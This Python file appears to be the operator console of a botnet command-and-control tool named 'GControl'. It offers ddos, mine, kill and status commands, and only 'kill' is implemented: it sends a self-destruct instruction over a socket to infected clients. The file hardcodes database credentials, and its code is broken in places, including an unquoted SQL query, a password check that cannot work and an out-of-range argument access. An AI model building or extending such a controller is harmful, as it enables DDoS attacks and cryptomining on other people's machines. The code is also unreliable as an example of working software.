import json
import socket
import mariadb
from getpass import getpass

SERVER_IP = ""
SERVER_PORT = 12000

conn = mariadb.connect(
    user="111A",
    password="26hhkx7tjb",
    database="GControl",
    host=SERVER_IP,
    port=3306
)

cursor = conn.cursor()

"""
Commands: help, kill, ddos, mine, status, connect
"""

def connect():
    pass

def status():
    pass

def mine():
    pass

def ddos():
    pass

def kill(args: list) -> int:
    if not args:
        request = json.dumps({
            "instruction": "kill",
            "ip": "*"
        })

    if args[0] == "help":
        print("This command will send a self destruct message to all specified clients")
        print("kill [ip]")
        print("If no ip is specified a general kill message will be sent")
        return 0

    else:
        request = json.dumps({
            "instruction": "kill",
            "ip": args[0]
        })

    password = getpass("Enter password: ")
    cursor.execute("SELECT password FROM admins WHERE username = 111A")
    for password_ in cursor:
        if password_ != password:
            print("Invalid password")
            return 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    sock.send(request.encode())


def terminal_help():
    for command in commands.keys():
        print(command)
    print("For command specific help type \"<command> help\"")


commands = {"connect": connect, "status": status, "mine": mine, "ddos": ddos, "kill": kill, "help": terminal_help}


def main():
    while True:
        command = input("GControl ~ ")
        if command == "exit":
             exit()

        if command.split(" ")[0] not in list(commands.keys()):
            print("Invalid command")
            continue

        try:
            args = command.split(" ")[1:]
        except IndexError as e:
            args = []

        try:
            commands[command.split(" ")[0]](args)
        except KeyError as e:
            print("Invalid arguments")


if __name__ == "__main__":
    main()
